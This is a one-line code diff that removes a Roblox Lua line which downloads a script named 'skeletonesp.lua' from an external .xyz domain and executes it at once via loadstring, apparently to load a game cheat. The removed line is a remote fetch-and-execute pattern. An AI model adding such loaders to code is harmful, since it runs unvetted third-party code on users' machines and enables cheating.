@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://stepbrofurious.xyz/skeletonesp.lua"))()
